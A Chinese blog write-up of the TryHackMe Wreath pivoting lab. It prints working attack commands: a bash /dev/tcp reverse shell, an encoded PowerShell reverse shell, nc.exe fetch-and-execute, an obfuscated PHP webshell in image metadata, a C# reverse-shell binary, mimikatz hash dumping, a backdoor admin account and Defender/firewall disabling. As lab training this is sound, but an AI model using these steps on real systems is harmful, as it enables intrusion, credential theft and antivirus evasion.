# Wreath
复习了几天，把自己写的辣鸡wp都看了看，ad也复了复，顺便还将之前一些不懂和遗漏的一些问题都解决了，所谓温故而知新

在继续红队路径之前，先来玩一玩**期待已久**的Wreath

---

了解如何通过破坏面向公众的 Web 计算机并通过隧道传输流量以访问 Wreath 网络中的其他计算机来透视网络。

---

**实验室是公共环境，不是私人的，请遵守TryHackMe规则，不要删除或停止任何服务、修改与任务相关的密码等会影响他人实验的操作，这是不道德的**

**实验室是公共环境，不是私人的，请遵守TryHackMe规则，不要删除或停止任何服务、修改与任务相关的密码等会影响他人实验的操作，这是不道德的**

**实验室是公共环境，不是私人的，请遵守TryHackMe规则，不要删除或停止任何服务、修改与任务相关的密码等会影响他人实验的操作，这是不道德的**

![在这里插入图片描述](https://img-blog.csdnimg.cn/5c70a34ac3b34136909860a94ae5e0c9.png)

## 背景故事

突然，一位大学的老朋友托马斯·瓦特（Thomas Wreath）在几年没有联系后给你打电话。你花几分钟时间追赶他，然后他透露他打电话的真正原因：

“所以我听说你开始黑客攻击？太厉害了！我的家庭网络上为我的项目设置了几台服务器，我想知道您是否想评估它们？

在决定接受这份工作之前，你花点时间考虑一下——毕竟这是给朋友的。

拒绝他的付款提议，你告诉他：

**我来吧！**

---

## 信息

托马斯已发送有关该网络的以下信息：

我的家庭网络上有两台机器托管项目和我自己正在处理的东西 - 其中一台有一个端口转发的网络服务器，所以如果你能找到漏洞，那就是你的方式！它服务于一个网站，该网站从我自己的 PC 推送到我的 git 服务器进行版本控制，然后克隆到面向公众的服务器。看看你能不能进入这些！我自己的PC也在该网络上，但我怀疑您是否能够进入该网络，因为它打开了保护功能，不会运行任何易受攻击的内容，并且无法通过面向公众的网络部分访问。好吧，我说的是PC - 从技术上讲，它是一个重新利用的服务器，因为我有一个备用许可证，但同样的区别。

由此我们可以获取以下信息：

- 网络上有三台计算机
- 至少有一个面向公众的网络服务器
- 网络上某处有一个自托管的 git 服务器
- git 服务器是内部的，所以 Thomas 可能已经将敏感信息推送到其中
- 网络上有一台安装了防病毒软件的PC，这意味着我们可以猜测这可能是Windows
- 从听起来，这可能是Windows的服务器变体，它可能对我们有利。
（假定的）Windows PC无法直接从Web服务器访问

这足以开始！

注意：我们也鼓励您将此网络视为渗透测试 - 即 记下每个步骤的笔记和屏幕截图，并在 结束（特别是如果你还不熟悉写这样的 报告）。跟踪您创建的任何文件（例如工具或有效负载）和用户也是一个好主意。报告不会被标记，但撰写报告的行为是您将来可能做的任何专业工作或认证的良好做法。任务中将有更多关于实际报告编写的信息 ，但现在只关注广泛的注释和屏幕截图。

---

## 枚举

### 端口扫描

循例，仍然是nmap:

```bash
┌──(root🐦kali)-[/home/sugobet]
└─# nmap -sS 10.200.90.200 -Pn -p- -T4
```

![在这里插入图片描述](https://img-blog.csdnimg.cn/a0ee1b8e03f04a158f8ce194e141f905.png)

使用nmap的http-headers脚本来查找操作系统：

```bash
┌──(root🐦kali)-[/home/sugobet]
└─# nmap --script=http-headers 10.200.90.200 -p 80,443
```

![在这里插入图片描述](https://img-blog.csdnimg.cn/8365b6a791724b6b8abeaa4cec9bef24.png)

### Web枚举

进入web看看,发现跳转到了：thomaswreath.thm

![在这里插入图片描述](https://img-blog.csdnimg.cn/fc7b63f2faf54e21ba0e4de0323c0ae2.png)

将其添加到/etc/hosts

个人信息：

![在这里插入图片描述](https://img-blog.csdnimg.cn/f1b65505771444f0a080e16172cd89a7.png)

探测最高的端口服务信息：

	nmap -sV 10.200.90.200 -p 10000

![在这里插入图片描述](https://img-blog.csdnimg.cn/5b0549cd9b664396965c02976cae002f.png)

## Reverse shell

百度搜索该版本，能找到存在CVE-2019-15107

该漏洞由于password_change.cgi文件在重置密码功能中存在一个代码执行漏洞，该漏洞允许恶意第三方在缺少输入验证的情况下而执行恶意代码

TryHackMe为我们提供了exp，那就直接用就行

![在这里插入图片描述](https://img-blog.csdnimg.cn/67f35d2a24144135a12ced48ac911825.png)

由于这个shell升级有点麻烦，另外开个nc再次reverse shell

```bash
┌──(root🐦kali)-[/home/sugobet]
└─# nc -vlnp 8888
```

目标执行：

	/bin/bash -i >& /dev/tcp/10.50.91.179/8888 0>&1

![在这里插入图片描述](https://img-blog.csdnimg.cn/2ccf2c0d01504167b5b30d1238baf7f3.png)

root目录下存在.ssh

![在这里插入图片描述](https://img-blog.csdnimg.cn/d903c6a9769146ef8ce2fddf307446b5.png)

我们可以选择在攻击机上使用ssh-keygen，将公钥丢到authorized_keys；或者将root的私钥下载过来，并祈祷它没有密码

由于这个是公共环境，显然利用root的私钥是更明智的做法

![在这里插入图片描述](https://img-blog.csdnimg.cn/ebddeefb76814320b67f594d0972597a.png)

很幸运，它并没有密码

---

## Pivoting - 旋转

这里tryhackme教了几个工具去做隧道、代理和端口转发，这里就不详细记录了

- Proxychains和FoxyProxy用于访问使用其他工具之一创建的代理
- SSH 可用于创建端口转发和代理
- plink.exe 是适用于 Windows 的 SSH 客户端，允许您在 Windows 上创建反向 SSH 连接。
- Socat 是重定向连接的不错选择，可用于以各种不同的方式创建端口转发
- Chisel可以做与SSH端口转发/隧道完全相同的事情，但不需要在盒子上访问SSH。
- 当我们在目标上具有SSH访问权限时，sshuttle 是创建代理的更好方法

我觉得sshuttle挺不错

---

## 内网枚举 - 横向移动 -> Windows Server

**假装tryhackme的openvpn并不存在**

### SSH隧道建立

由于我们已经获得了ssh访问权限，那么正好可以使用sshuttle搭建隧道

```bash
┌──(root🐦kali)-[/home/sugobet]
└─# sshuttle -r root@10.200.90.200 10.200.90.0/24 -x 10.200.90.200 --ssh-cmd "ssh -i ./id_rsa"
```

由于这个隧道通过thm的openvpn到达目的，所以我们可能无法在路由表、使用察觉任何差距

我们可以使用wireshark查看差异

![在这里插入图片描述](https://img-blog.csdnimg.cn/cd5419ddec2441fb859959167f9d6687.png)

wireshark:

![在这里插入图片描述](https://img-blog.csdnimg.cn/83b216afd63840a590eec6779b0933ab.png)


可以看到关于本机10.200.90.0/24网段的流量被sshuttle转发到ssh目标200，再转发到250。而不是直接通过thm的openvpn隧道直接到达250


### 内网主机扫描

由于隧道只能转tcp的流量，icmp、udp等流量均无法通过隧道，所以无法直接对着网段进行主机存活扫描

将nmap二进制文件传到目标：

![在这里插入图片描述](https://img-blog.csdnimg.cn/242de5f76156491a9e39e2bfafa86d69.png)

根据题目意思：

	./nmap 10.200.90.0/24 --exclude 10.200.90.200,10.200.90.250,10.200.90.1 -T5 -sn -PE

![在这里插入图片描述](https://img-blog.csdnimg.cn/c4f2fa9afd954c1a8e36a420e056b69c.png)

内网另外两台主机：100、150

### 端口扫描

	./nmap 10.200.90.100,150 -sS -T5 -Pn

![在这里插入图片描述](https://img-blog.csdnimg.cn/c3b4b770602348d8a7bc685bae579097.png)

看到wsman，猜测这是windows机子，对其进行更详细的端口扫描，发现只有这三个端口开着

### 内网GitStack Web服务枚举

进入80端口：

![在这里插入图片描述](https://img-blog.csdnimg.cn/9a8fb3d1362b4e15b14f9a31667e17fb.png)

登录页面：

![在这里插入图片描述](https://img-blog.csdnimg.cn/57bf0ac5bf9d42568555aa9e9361c903.png)

默认凭据失败

虽然貌似没有版本信息泄露，但是题目引导我们使用searchsploit

![在这里插入图片描述](https://img-blog.csdnimg.cn/7bd7512a182c4e879389945ff27593b6.png)

### 内网GitStack服务RCE

将exp cp一份出来，由于exp是python2的语法，将其改成python3的语法就能用了

![在这里插入图片描述](https://img-blog.csdnimg.cn/7ca7b075308742febec04d9c1f586399.png)

题目要求添加gitserver.thm到/etc/hosts

### RCE到Reverse shell

![在这里插入图片描述](https://img-blog.csdnimg.cn/3f626dc8fcb94b869f9e40199cf94ad9.png)

目标无法ping通我们攻击机

### Socat 中继器

在这种环境下，socat更适合。

利用socat将200机器的流量转发到我们攻击机

将socat二进制可执行文件传过去，防火墙放行18888

```bash
[root@prod-serv hackerM]# ./socat tcp-l:18888 tcp:10.50.91.179:8888 &
```

攻击机开启nc监听：

	nc -vlnp 8888

利用RCE reverse shell到200机器的18888端口

```shell
powershell.exe+-c+"$client+%3d+New-Object+System.Net.Sockets.TCPClient('10.200.90.200',18888)%3b$stream+%3d+$client.GetStream()%3b[byte[]]$bytes+%3d+0..65535|%25{0}%3bwhile(($i+%3d+$stream.Read($bytes,+0,+$bytes.Length))+-ne+0){%3b$data+%3d+(New-Object+-TypeName+System.Text.ASCIIEncoding).GetString($bytes,0,+$i)%3b$sendback+%3d+(iex+$data+2>%261+|+Out-String+)%3b$sendback2+%3d+$sendback+%2b+'PS+'+%2b+(pwd).Path+%2b+'>+'%3b$sendbyte+%3d+([text.encoding]%3a%3aASCII).GetBytes($sendback2)%3b$stream.Write($sendbyte,0,$sendbyte.Length)%3b$stream.Flush()}%3b$client.Close()"
```

![在这里插入图片描述](https://img-blog.csdnimg.cn/7de075a660a240cab0b835605a9d94b9.png)

成功getshell

---

**拓扑更新**

![在这里插入图片描述](https://img-blog.csdnimg.cn/e4c5198ac1144fb9a827d248532aa0b4.png)

### 内网Windows 本地 Persisting

做一下简单的本地持久化

	net user hackerM 1q2w3e4r /add
	net localgroup Administrators hackerM /add
	net localgroup "Remote Management Users" hackerM /add
	net localgroup "Remote Desktop Users" hackerM /add

进xfreerdp

	xfreerdp /v:10.200.90.150 /u:hackerM /p:1q2w3e4r +clipboard /dynamic-resolution /drive:/tmp,share

- 由于公共实验室，人比较多，如果遇到特别卡的情况可以看情况协商shutdown -r -t 0

**这里mimikatz必须使用admin权限的cmd，接下来的命令才能生效**

![在这里插入图片描述](https://img-blog.csdnimg.cn/3fe62b64ff2f4789b4324d625526b283.png)

转储sam

	mimikatz # lsadump::sam

administrator的NTLM hash:

	37db630168e5f82aafa8461e05c6bbd1

admin的密码有可能会被其他人更改，导致mimikatz获得的htlm hash无法在room中正确提交，如果觉得重置环境太麻烦的话还是直接看wp吧

---

## 使用新C2框架 - Empire && StarKiller

自从红队路径的C2简介房间中介绍了msf的gui版本 - Armitage，我使用了一下，体验并不是很好，我觉得确实有点差劲，问题很多，期待Armitage的改进

我不会将我的empire学习过程写在这里，它非常类似于msf

[empire wiki](https://bc-security.gitbook.io/empire-wiki/quickstart)

在tryhackme上也有专门的[room](https://tryhackme.com/room/rppsempire)介绍empire

empire && starkiller VS metasploit && armitage

但empire更适合Windows环境的目标

我个人对empire && starkiller的体验还不错

![在这里插入图片描述](https://img-blog.csdnimg.cn/4a1f246fcd3c43cbb4b631cd3e5916a8.png)

第一次开这么多终端，有点嗨客的感觉了

![在这里插入图片描述](https://img-blog.csdnimg.cn/06f303376e944ec19e1814159f0422db.png)


## Tricks

- evil-winrm -s选项可以在建立会话时将指定psh脚本载入内存，它可以是一个文件夹
- /usr/share/powershell-empire/empire/server/data/module_source/situational_awareness/network/

---

## 内网 横向移动 -> PC

我们的最终目标是拿下wreath的pc机器，让我们接着继续

### 端口扫描

利用Empire的模块对100机器进行端口扫描

![在这里插入图片描述](https://img-blog.csdnimg.cn/6f167219941c42d29201665992661cf9.png)

### Chisel 本地端口转发

Wreath告诉我们，他在自己的PC上使用本地环境在他的网站上工作

即便是200机器也无法对其服务进行访问，所以我们之前搭建的sshuttle VPN也没啥用了

幸好我们已经拿下了git服务器，我们可以通过它来当作我们访问100机器服务的跳板

sshuttle + chisel，这样150机器可以直接通过VPN将流量转发到攻击机

150机器设置防火墙，放行指定端口流量

	netsh advfirewall firewall add rule name="Chisel-hackerM" dir=in action=allow protocol=tcp localport=28888

前面我们使用xfreerdp的时候已经设置share了，通过这个share将chisel.exe传过去

由于150机器无法直接与我们攻击机通信，我们只能进行正向连接进行端口转发

150机器开启chisel服务：

![在这里插入图片描述](https://img-blog.csdnimg.cn/e71cb245cbff4abbb06cca57b4184ccd.png)

攻击机客户端，本地端口转发：

	chisel client 10.200.90.150:28888 8080:10.200.90.100:80 &

这里还是得后台运行了，终端数量有点多了，屏幕不够大

这里题目问网站使用的编程语言和版本是多少，但wappalyzer和网页源代码均无答案

但当我们尝试访问不存在的页面，它披露了我们想要的信息

![在这里插入图片描述](https://img-blog.csdnimg.cn/b9ffb44536ee4a0b875270062811f115.png)

### Git

我们从简报中知道，Thomas 一直在使用 git server 来控制他的项目——仅仅因为 Web 服务器上的版本不是最新的，并不意味着他没有更频繁地提交回购！换句话说，与其模糊化服务器，我们可能只需下载站点的源代码并在本地查看即可。

理想情况下，我们可以直接从服务器克隆存储库。这可能需要我们需要找到的凭据。或者，鉴于我们已经拥有对 git 服务器的本地管理员访问权限，我们可以从硬盘下载存储库并在本地重新组装它，这不需要任何（进一步的）身份验证。

![在这里插入图片描述](https://img-blog.csdnimg.cn/d72efbc04e9d45429fe33b5ad6848b33.png)

将Website.git文件夹copy到\\\\tsclient\share\\

![在这里插入图片描述](https://img-blog.csdnimg.cn/c4df0a012dea45359a32099ec0253f2f.png)

tryhackme这里使用的是gittools，我这里就使用更强大的[GitHacker](https://github.com/WangYihang/GitHacker)，在这里可以达到与GitTools一样的效果

但GitHacker貌似无法从本地文件夹中提取信息，我们可以使用python开个http服务

	python3 -m http.server 9999

执行githacker

	githacker --url http://127.0.0.1:9999/Website/.git/ --output-folder ./res

检索一下我们获得的东西：

```bash
──(root🐦kali)-[/tmp]
└─# tree ./res                  
./res
└── c6e39901bb505c051ad419efc1fa24a1
    ├── css
    │   ├── bootstrap.min.css
    │   ├── font-awesome.min.css
    │   └── style.css
    ├── favicon.png
    ├── fonts
    │   ├── FontAwesome.otf
    │   ├── fontawesome-webfont.eot
    │   ├── fontawesome-webfont.svg
    │   ├── fontawesome-webfont.ttf
    │   ├── fontawesome-webfont.woff
    │   └── fontawesome-webfont.woff2
    ├── img
    │   ├── img-profile.jpg
    │   ├── portfolio-1.jpg
    │   ├── portfolio-2.jpg
    │   ├── portfolio-3.jpg
    │   ├── portfolio-4.jpg
    │   ├── preloader.gif
    │   └── puff.svg
    ├── index.html
    ├── js
    │   ├── bootstrap.min.js
    │   ├── jquery-2.1.4.min.js
    │   └── scripts.js
    └── resources
        ├── assets
        │   ├── css
        │   │   ├── Andika.css
        │   │   └── styles.css
        │   ├── fonts
        │   │   ├── AndikaNewBasic-BoldItalic.ttf
        │   │   ├── AndikaNewBasic-Bold.ttf
        │   │   ├── AndikaNewBasic-Italic.ttf
        │   │   ├── AndikaNewBasic-Regular.ttf
        │   │   ├── Andika_New_Basic.zip
        │   │   └── OFL.txt
        │   └── imgs
        │       └── ruby.jpg
        └── index.php
```

阅读index.php代码

由于TryHackMe在这里解释的明明白白的，我就不重复赘述了，挺简单的

打开文件上传点

这里貌似无法通过端口转发访问到resources/

![在这里插入图片描述](https://img-blog.csdnimg.cn/b57f906eb96041498e934bcede2b424f.png)

我们有150机器的rdp，那就直接在150机器上使用浏览器吧

![在这里插入图片描述](https://img-blog.csdnimg.cn/1d15b010a3b34c1ab02b07094b1c0d9f.png)

我们在150机器使用mimikatz转储sam中的凭据的时候我们获取了Thomas的hash并通过CrackStation获得了其明文密码

现在我们可以利用这组凭据顺利通过身份认证

![在这里插入图片描述](https://img-blog.csdnimg.cn/d3f7e42764464e218ea1147c7da447a5.png)

前面我们已经了解了后端防护代码，现在就利用exiftool制作图片马：

	exiftool -Comment="<?php phpinfo();?>" ./op.jpg.php

将图片马上传

![在这里插入图片描述](https://img-blog.csdnimg.cn/7f634d24f3fd4c7ba4758e86a4be5c0b.png)

phpinfo被成功执行

---

## Anti-Virus evasion

tryhackme:

**防病毒规避是花圈网络的第三个也是最后一个主要教学点。**

从本质上讲，AV Evasion是一个**快速变化**的话题。这是黑客和开发人员之间不断的舞蹈。每次开发人员发布新功能时，黑客都会开发一种解决方法。每次黑客绕过新功能时，开发人员都会发布另一个功能来关闭漏洞，因此循环继续。**由于这个过程的速度很快，几乎不可能教授前沿技术（并期望它们在任何时间长度内保持相关性）**

在AV规避方面，我们有两种主要类型可供选择：

- 磁盘上规避
- 内存中规避

在过去，内存中逃避足以绕过大多数AV解决方案，因为大多数防病毒软件无法扫描存储在正在运行的进程内存中的脚本。然而，情况已不再如此，因为微软实现了一项名为**Anti-Malware Scan Interface**（AMSI）的功能。AMSI 本质上是 Windows 的一项功能，可在脚本进入内存时对其进行扫描。

我们可以在得知目标系统版本、防病毒软件及其版本等信息之后，我们可以在我们本地中搭建虚拟机环境，并尝试绕过技术

### Anti-Virus 检测技术

一般来说，检测方法可分为两类：

- 静态检测
- 动态/启发式/行为检测

静态病毒恶意软件检测方法查看文件本身

静态检测又细分为：

- 文件哈希和比较
- 字节/字符串匹配

动态方法查看文件的行为方式

- 通过可执行的逐行检查执行流程。根据预定义的规则，说明哪种类型的操作是恶意的
- 可疑软件可以在AV软件的密切监督下在沙盒环境中直接执行。如果程序恶意行为，则将其隔离并标记为恶意软件

---

### PHP Payload混淆

**在AV规避方面，任何不同的东西都是好的**

payload:

```php
<?php
    $cmd = $_GET["wreath"];
    if(isset($cmd)){
        echo "<pre>" . shell_exec($cmd) . "</pre>";
    }
    die();
?>
```

我们可以采取多种措施，包括但不限于：

- 切换漏洞利用的某些部分，使它们处于异常顺序
- 对所有字符串进行编码，使其无法识别
- 拆分代码的不同部分（例如shell_exec($_GET[...]))

在线php混淆工具：https://www.gaijin.at/en/tools/php-obfuscator

将shellcode做混淆后制作图片马

```bash
┌──(root🐦kali)-[/home/sugobet]
└─# exiftool -Comment="<?php \$p0=\$_GET[base64_decode('d3JlYXRo')];if(isset(\$p0)){echo base64_decode('PHByZT4=').shell_exec(\$p0).base64_decode('PC9wcmU+');}die();?>" ./op.jpg.php
```

![在这里插入图片描述](https://img-blog.csdnimg.cn/3a64e45b79054aba8411eb4b89afb7cb.png)

现在我们已经可以RCE了

### RCE到Reverse shell

我们有一个问题。与Linux中通常有很多方法可以获得反向shell不同，Windows中的选项数量要少得多，因为**Windows默认情况下往往不会安装许多脚本语言**。

所以我们有几种选择：

- Powershell往往是Windows反向shell的首选。不幸的是，Defender确切地知道PowerShell反向shell是什么样子的，所以我们必须做一些严重的混淆才能让它工作。
- PHP，我们知道目标已经安装了PHP解释器。Windows PHP反向shell往往不稳定，并且再次可能会触发Defender。
- 我们可以使用 msfvenom 生成一个可执行的反向 shell，然后使用 webshell 上传并激活它。

我们还可以直接上传[nc](https://github.com/int0x33/nc.exe/)

**Certutil是一个默认的Windows工具，用于（除其他外）下载CA证书。这也使其成为文件传输的理想选择，但 Defender 将其标记为恶意。**

rce执行：

	curl http://10.50.91.179:8000/nc.exe -o c:\windows\temp\nc-hackerM.exe

![在这里插入图片描述](https://img-blog.csdnimg.cn/63cc45aa4a4c4083a04e57c6c2a6c84b.png)

执行nc reverse shell

	powershell c:\windows\temp\nc-hackerM.exe 10.50.91.179 4321 -e cmd

![在这里插入图片描述](https://img-blog.csdnimg.cn/5ad2e4de578b47c9beffb63534d69b9e.png)

### 枚举

我们现在拥有低权限shell

那么接下来该做的应该是想办法进行权限提升

查看拥有的特权：

![在这里插入图片描述](https://img-blog.csdnimg.cn/55fee125038a4594989a537ce55acd47.png)

我们可以进行令牌模拟

**Windows 服务通常容易受到各种攻击，因此我们将从那里开始。一般来说，核心Windows服务不太可能受到任何攻击 - 用户安装的服务更有可能出现漏洞。**

查找非系统服务：

	wmic service get name,displayname,pathname,startmode | findstr /v /i "c:\windows"

会发现一个缺少引号的binpath

![在这里插入图片描述](https://img-blog.csdnimg.cn/737cc620d5664461a0700d7b374981cc.png)

使用icacls，发现有个目录我们所有权：

	icacls C:\Program Files (x86)\System Explorer

### 权限提升

我们有一个特权，我们几乎可以肯定使用它来升级到系统权限。缺点是我们需要混淆漏洞，以便让它们通过 Defender。

由于win Defender的存在，所以我们无法借助msf生成payload

tryhackme这里教导使用C#自己编写

	apt install mono-devel

```csharp
using System;
using System.Diagnostics;

namespace RShell
{
    class Program
    {
        static void Main()
        {
            Process proc = new Process();
            ProcessStartInfo procInfo = new ProcessStartInfo("c:\\windows\\temp\\nc-hackerM.exe", "10.50.91.179 54321 -e cmd");
            procInfo.CreateNoWindow = true;

            proc.StartInfo = procInfo;
            proc.Start();
        }
    }
}
```

编译

	mcs ./RShell.cs

开启smbserver:

	python3 /usr/share/doc/python3-impacket/examples/smbserver.py hack . -smb2support -username hacker -password 1q2w3e4r

目标下载：

	net use \\10.50.91.179\hack /user:hacker 1q2w3e4r
	copy \\10.50.91.179\hack\RShell.exe c:\windows\temp\rs-hackerM.exe

攻击机开启nc监听，目标执行rs-hackerM.exe

![在这里插入图片描述](https://img-blog.csdnimg.cn/e848e8436e1146558c202b868eebdee4.png)

可以get到shell

将文件复制到刚刚存在漏洞的地方

	C:\Program Files (x86)\System Explorer>copy \\10.50.91.179\hack\RShell.exe .\System.exe

为了节省时间，重启服务：

	sc stop SystemExplorerHelpService
	sc start SystemExplorerHelpService

![在这里插入图片描述](https://img-blog.csdnimg.cn/fe080d6a89d341a7b4eec1af803d2ee5.png)

getshell，system

[这里](https://blog.csdn.net/wxg189392381/article/details/82256007)包含关于使用C#创建Windows service内容的一篇文章

---

### C2登场 - Empire

这不是tryhackme的内容，但我想尝试C2上线，让我们开始吧

我们利用system shell建个用户

在150机器登录100的rdp

![在这里插入图片描述](https://img-blog.csdnimg.cn/45f5cc8590a34a59a8869a1118ab1245.png)

这里连接有点慢，需要等一会

![在这里插入图片描述](https://img-blog.csdnimg.cn/41cd9da68eda4572aeb2c131e105c5e4.png)

进来要做的事情很简单，把杀软给他关了

把防火墙关了

看了一下Win Defender，把实时关了

![在这里插入图片描述](https://img-blog.csdnimg.cn/0e47b41eabd54eefb9f80c450069cf64.png)


为windows防火墙添加入站和出战规则，允许所有程序、端口、协议通过

![在这里插入图片描述](https://img-blog.csdnimg.cn/15979220606f4dd08bf04539366ffb8e.png)

![在这里插入图片描述](https://img-blog.csdnimg.cn/4e1571a5dc614389ba2c4104849768a1.png)

我这里终端太多了，就用StarKiller

创建监听器：

![在这里插入图片描述](https://img-blog.csdnimg.cn/a42fa2332786403f9da9d5706ddf5066.png)

使用的stager是multi/launcher

![在这里插入图片描述](https://img-blog.csdnimg.cn/8263cef8894d46449275063ec44941e0.png)

复制payload到100机器的cmd，就能成功上线

![在这里插入图片描述](https://img-blog.csdnimg.cn/199144052a9141bfa568964156b79a30.png)

---

## 获取宝藏

**TryHackMe:**

未经事先明确同意，绝不应考虑数据泄露。一般来说，大多数外部活动将强烈禁止从受感染的系统中获取数据;然而，值得记住的是，内部参与可能并非如此 - 一些外部参与直接为红队设定了目标，这些目标围绕着一旦受到损害就从目标中泄露一组数据。即使这是一项可能不会每天使用的技能，它仍然值得学习。

外泄的目标始终是从受损目标中删除数据。这可能是密码、密钥、客户/员工数据或任何其他有用或有价值的东西。如果要泄露的数据是纯文本格式，那么这可以像将文件内容从远程 shell 复制并粘贴到本地文件中一样简单。如果数据是二进制格式，或者不能只是复制和粘贴，则必须使用更复杂的方法来泄露目标文件。

泄露数据的常用方法是在无害的协议（通常是编码的）中将其走私出去。例如，DNS 通常用于（相对）悄悄地泄露数据。HTTPS往往是一个不错的选择，因为在出口发生之前，数据将被彻底加密。ICMP可用于（非常缓慢地）将数据从网络中取出。DNS-over-HTTPS非常适合数据泄露，甚至经常使用电子邮件。

在现实世界中，攻击者将寻求尽可能安静地泄露数据，因为受感染的网络上可能存在活跃的入侵检测系统，如果检测到数据，该系统会提醒网络管理员违规。因此，攻击者不太可能使用像FTP，TFTP，SMB或HTTP这样简单的协议;但是，在不受监控的网络中，这些仍然是移动文件的好选择。

值得注意的是，大多数命令和控制（C2）框架都带有悄悄泄露数据的选项。实际上，这可能是不良行为者泄露数据的方式，因此值得了解各种框架使用的当前“标准”。还有许多独立的工具可用于自动发送和接收混淆数据。

简而言之，渗透的唯一限制是您的想象力。虽然肯定有可用的常用技术（以及许多利用它们的工具），但最成功的始终是新的和晦涩难懂的方法。谁知道呢？也许您甚至会找到隐写术的合法用途！

---

来试一试

由于我们C2已经上去了，那么通过Empire调用module来执行一些操作

但我们现在可以直接丢个mimikatz过去

![在这里插入图片描述](https://img-blog.csdnimg.cn/79261b8f4b5243c489ec2744420ec42a.png)

---

## 结束

游戏结束，我们从外网打到内网，我们学习了各种隧道、代理、端口转发，横向移动了两台主机，学习了C2框架Empire和它的Gui版本StarKiller，还学习了简单的Anti-Virus绕过，这些都为我们接下来红队路径剩下的任务打下了基础

![在这里插入图片描述](https://img-blog.csdnimg.cn/c25687b6276f47a4953f04fff0d90787.png)
